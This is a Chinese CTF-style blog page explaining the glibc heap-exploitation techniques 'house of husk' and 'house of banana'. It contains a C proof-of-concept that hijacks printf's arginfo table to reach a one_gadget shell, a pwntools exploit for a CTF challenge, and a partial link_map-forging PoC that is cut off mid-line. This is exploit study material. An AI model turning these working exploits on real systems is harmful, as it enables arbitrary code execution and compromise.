    <div class="post-body" itemprop="articleBody">
          <h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><blockquote>
<p>介绍：</p>
<p><code>house of husk</code> 是对 <code>printf</code> 函数内部进行注册的自定义格式化字符的函数指针进行了劫持</p>
<p>使用版本：</p>
<p>经过测试，<code>glibc 2.23--2.35</code> 版本中，该手法均可用</p>
<p>漏洞原理：</p>
<p><code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针，在这期间并没有进行任何地址的合法性检查</p>
<p>利用方法：</p>
<p>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code> ，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></p>
<p>spec是格式化字符，比如最后调用的是 <code>printf(&quot;%X\n&quot;,a)</code>,那么应该将 <code>__printf_arginfo_table[88]</code> 的位置写入 <code>backdoor()</code></p>
<p>使用前提：</p>
<ol>
<li><p>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</p>
</li>
<li><p>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址</p>
</li>
<li><p>通过条件 <code>2</code> ,让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</p>
</li>
</ol>
<p>攻击效果：</p>
<p>执行到 <code>printf</code> 函数时，就可以跳转到 <code>backdoor</code> 上</p>
</blockquote>
<p>本文出现的 <code>glibc</code> 源码均为 <code>2.27</code> 版本</p>
<p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p>
<p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>spec</code> 是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 <code>a</code></p>
<p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p>
<p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到  <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p>
<p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p>
<p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>而 <code>printf_positional</code> 函数中会在下面这个位置调用 <code>__parse_one_specmb</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png" alt="image-20230213205442536"></p>
<p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 <code>one_gadget</code> 上（如下） </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png" alt="image-20230213210814663"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png" alt="image-20230213210736611"></p>
<p> <strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p>
<p><code>poc</code> 源自  <a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge">题目链接</a></p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png" alt="image-20230214123424178"></p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png" alt="image-20230214123517550"></p>
<p>程序就是往 <code>bss</code> 段上输入数据，然后 <code>printf</code> 将数据打印出来。</p>
<p>程序为静态链接，并且 <code>flag</code> 就在 <code>data</code> 段中，只要将其读出来即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png" alt="image-20230214123826356"></p>
<p>程序没有开 <code>PIE</code> 保护，因为静态链接的原因，所以 <code>libc</code> 中的代码和数据地址都是已知的，这就给了我们劫持 <code>printf</code> 函数中 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 两个指针的机会</p>
<p>我们先搜一下这两个地址看看在哪</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png" alt="image-20230214124341330"></p>
<p>发现输入数据的起始地址 <code>name</code> 比那两个指针要低，这就说明我们可以填充数据然后篡改两个指针，从而执行 <code>printf</code> 函数的时候劫持执行流</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>正常填充垃圾数据，将 <code>__printf_function_table</code> 篡改为任意值（不为 <code>NULL</code>）即可。</p>
<p>将 <code>__printf_arginfo_table</code> 篡改为 <code>地址A</code> （这个 <code>地址A</code> 随意，只要满足 <code>*(A+(0x73*8))</code> 处的值为 <code>__stack_chk_fail()</code> 的地址就行（ <code>0x73</code> 是 格式化字符<code>s</code> ））</p>
<p>但如果仅仅只伪造上面两个位置的数据，其他地方填充为垃圾数据的话，则会在 <code>__parse_one_specmb</code> 函数中下面的代码部分出现问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_modifier_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || __printf_modifier_table[*format] == <span class="literal">NULL</span></span><br><span class="line">    || HANDLE_REGISTERED_MODIFIER (&amp;format, &amp;spec-&gt;info) != <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>在溢出伪造数据时，需要控制 <code>__printf_modifier_table</code> 为 <code>NULL</code> 不然会触发一些别的条件的判断导致程序崩溃或者执行流走偏，这个 <code>__printf_modifier_table</code> 位于 <code>__printf_function_table</code> 地址加 <code>8</code> 的位置</p>
<p>满足上面的部分就可以成功在 <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> 这个位置来劫持执行流，我们将此处控制为 <code>__stack_chk_fail()</code> ，该函数执行时，会打印出 <code>__libc_argv[0]</code> 指向的字符串</p>
<p>先确定 <code>__libc_argv[0]</code> 的地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png" alt="image-20230214131007737"></p>
<p>然后需要向这个地址里写入一个指向 <code>flag</code> 地址的指针。</p>
<p>我布置的情况如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png" alt="image-20230214131134190"></p>
<p>上述布局全部完成，执行 <code>printf((__int64)&quot;Hi, %s. Bye.\n&quot;, name);</code> 时就可以将 <code>flag</code> 打印出来</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=load(<span class="string">&#x27;readme_revenge&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x45ad0f</span>)</span><br><span class="line">leak_flag=<span class="number">0x4359B0</span></span><br><span class="line">flag_addr=<span class="number">0x6B4040</span></span><br><span class="line">payload=p64(flag_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x598</span></span><br><span class="line">payload+=p64(<span class="number">0x6B73E0</span>)<span class="comment">#__libc_argv[0]</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x640</span>-<span class="number">0x5a0</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#__printf_function_table</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#__printf_modifier_table</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+=p64(<span class="number">0x6b7aa8</span>)<span class="comment">#__printf_arginfo_table</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">0x72</span></span><br><span class="line">payload+=p64(leak_flag)<span class="comment">#__stack_chk_fail</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png" alt="image-20230214131708408"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>没想到日常使用的 <code>printf</code> 函数也是可以劫持执行流的。但需要注意该手法的利用条件其实有些苛刻，而且没有办法控制参数，只能劫持到 <code>one_gadget</code> 或者不需要参数的地址。所以除了少部分的题目外，该手法并不是一个最优的选择，但通过 <code>house of husk</code> 也让我了解到了 <code>printf</code> 函数中对于自定义格式化字符的处理流程以及可劫持执行流的位置，正所谓技多不压身，<code>house of husk</code> 确实是一个有趣的攻击思路</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/efb4678.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/efb4678.html" class="post-title-link" itemprop="url">关于house of banana的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:57:50" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><blockquote>
<p>攻击效果：</p>
<p>控制程序的执行流</p>
<p>适用版本：<code>glibc2.23</code> 到目前最新的 <code>2.36</code></p>
<p>注意： 使用 <code>setcontext</code> 来控制寄存器打 <code>orw</code> 的话，需要在 <code>2.29</code> 版本以上才行（ <code>2.27</code> 没有办法让 <code>rdx</code> 或 <code>rdi</code> 为堆地址）</p>
<p>利用条件：</p>
<ol>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ol>
</blockquote>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><code>link_map</code> 结构体的存储方式和堆块链表类似，是通过 <code>l_next</code> 和 <code>l_prev</code> 指针来连接的,而这个链表的头指针就是 <code>_rtld_global</code> 结构体中的 <code>_ns_loaded</code> 所存储的地址。</p>
<p> 如果我们可以通过 <code>large bin attack</code> 或其他方式将链表的头指针改为可控堆地址，这样就可以伪造第一个 <code>link_map</code> 结构体，从而控制结构体中的各个字段，下面代码是 <code>_dl_fini</code> 函数中的片段</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" />

<p>蓝色框中是要绕过 <code>if</code> 检查所需要伪造的字段，红色框中是劫持执行流的位置。</p>
<p>最终的目的是需要伪造一些字段绕过检查并布局一些字段为劫持执行流做准备，最终执行到 <code>array[i]</code> 时进行劫持。</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先需要恢复<code>l_next</code> 字段原本的值，这样之后的 <code>link_map</code> 就不用再伪造了。</p>
<p>将 <code>l_real</code> 字段改为伪造的 <code>link_map</code> 地址，以便满足 <code>if (l == l-&gt;l_real)</code> ，确保不会触发 <code>assert</code></p>
<p>将 <code>l_info[26]</code> 的值设置为非空，为了满足 <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p>
<p>如果满足这三个条件，那么就可以对 <code>array</code> 的地址进行设置，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure>

<p>为了更精准的控制 <code>array</code> ，我们控制 <code>l_addr</code> 为 <code>0</code> （事实上这个值通常也没有办法被控制，因为这个 <code>l_addr</code> 是堆块的 <code>prev_size</code>  字段，正常情况就是 <code>0</code>）</p>
<p>而 <code>DT_FINI_ARRAY</code> 这个宏就是 <code>26</code> ，<code>d_un</code> 则是一个联合体，定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">    Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br></pre></td></tr></table></figure>

<p>如果我们将 <code>l-&gt;l_info[26]</code> 的值设置为 <code>l-&gt;l_info[26]</code> 的地址，那么 <code>l-&gt;l_info[27]</code> 中的值则是 <code>array</code> </p>
<p><strong>注意：</strong>  <code>-&gt;</code> 操作符在 <code>C</code> 语言被定义为结构体指针成员的解引用和成员访问操作符，也就是说该操作符完成了两个操作，先对指针进行了解引用，然后再访问指针所指向的结构体成员。因此上面的代码 <code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> 进行了两次解引用最后将值赋给 <code>array</code> ，而 <strong>winmt</strong> 师傅在 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">文章</a> 中写到 <strong>“以及l-&gt;l_info[26]-&gt;d_un.d_ptr，也就是l-&gt;l_info[27]”</strong> ，这句话有点小问题，因为理解为 <code>l-&gt;l_info[27]</code> 的话，只进行了一次解引用，所以这里替 <strong>winmt</strong> 师傅纠正下 QAQ</p>
<p>接下来控制 <code>i</code> 的值，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br></pre></td></tr></table></figure>

<p><code>DT_FINI_ARRAYSZ</code> 这个宏是 <code>28</code> ，所以将 <code>l-&gt;l_info[28]</code> 的值设置为 <code>l-&gt;l_info[28]</code> 的地址，那么 <code>l-&gt;l_info[29]</code> 中的值再除 <code>8</code> ，则是最后的 <code>i</code></p>
<p>最后的劫持位置是函数指针 <code>array[i]</code> 被调用，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure>

<p>上面已经提到了 <code>array</code> 和 <code>i</code> 都可以被控制，因此这里可以执行代码，如果打 <code>one_gadget</code> 获取 <code>shell</code> 的话，直接布置地址即可，但是执行 <code>orw</code> 的话，需要先空走一轮函数调用，因为 <code>rdx</code> 再每轮循环后，都会被更新为堆地址（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" />



<p>走空一轮的意思就是跳转到 <code>ret</code> 指令上，然后立刻退出这一轮的函数指针调用，<code>i--</code> 然后调用下一个 <code>array[i]</code> 中存放的函数指针，此时的 <code>rdx</code> 已经为堆地址了，所以此时去跳转到 <code>setcontext+61</code>  的位置，布置 <code>SROP</code> ，调用 <code>read</code> 函数再次读入 <code>orw</code> 的 <code>rop</code> 链使其正好落到 <code>read</code> 函数的返回地址上，从而绕过沙箱保护。</p>
<p><strong>补充：</strong></p>
<p><code>2.27</code> 的 <code>libc</code> 中没办法控制寄存器走 <code>setcontext</code> ，因为其汇编如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" />

<p>对比下面这个图片（ <code>2.31</code> 的 <code>libc</code>），就会发现 <code>2.27</code> 没有 <code>rdi</code> 或者 <code>rdx</code> 被赋值为堆地址的指令,所以不好打 <code>orw</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" />





<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc poc.c -o poc -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rtld_global_dl_ns 0x61b060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> one_gadget 0x4f302</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x64e40</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc base %llx\n&quot;</span>,libc_base);</span><br><span class="line">  <span class="type">size_t</span> *p=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  p[<span class="number">3</span>]=libc_base+<span class="number">0x61c710</span>;<span class="comment">//l_next</span></span><br><span class="line">  p[<span class="number">5</span>]=p;<span class="comment">//l_real    也是伪造的link_map地址</span></span><br><span class="line">  p[<span class="number">34</span>]=&amp;p[<span class="number">34</span>];<span class="comment">//l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  p[<span class="number">35</span>]=&amp;p[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  p[<span class="number">36</span>]=&amp;p[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  p[<span class="number">37</span>]=<span class="number">0x8</span>;<span 